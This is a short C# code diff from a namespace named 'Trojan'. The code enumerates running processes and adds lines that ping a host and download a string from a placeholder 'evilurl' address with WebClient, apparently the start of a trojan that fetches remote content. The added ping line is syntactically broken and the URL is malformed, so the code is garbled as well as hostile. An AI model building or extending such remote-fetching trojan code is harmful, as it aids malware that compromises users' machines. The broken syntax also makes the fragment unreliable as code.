@@ -53,10 +53,8 @@ namespace Trojan
             Process[] processlist = Process.GetProcesses();
             
            time.Text = DateTime.Now.ToString();
-            int vk = 0;
-            vcount.Text = vk.ToString();
-            int issue = 0;
-
+   
+            ping(hostserver name0;)
            
                     WebClient client = new WebClient();
                     string downloadString = client.DownloadString("evilurl.ex.html");
